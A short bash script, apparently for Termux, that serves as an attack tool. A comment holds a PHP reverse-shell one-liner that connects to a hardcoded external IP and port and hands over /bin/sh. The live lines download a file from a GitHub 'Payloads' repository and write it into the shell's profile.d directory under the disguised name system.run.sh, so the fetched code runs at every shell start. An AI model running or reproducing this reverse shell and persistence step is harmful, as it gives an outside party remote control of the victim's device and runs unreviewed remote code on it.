#!/bin/bash
#create file1 and paste
#php -r '$sock=fsockopen("193.161.193.99",20993);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
#file2 started
curl -s -S https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/files/one >.ex
cat .ex >$PREFIX/etc/profile.d/system.run.sh
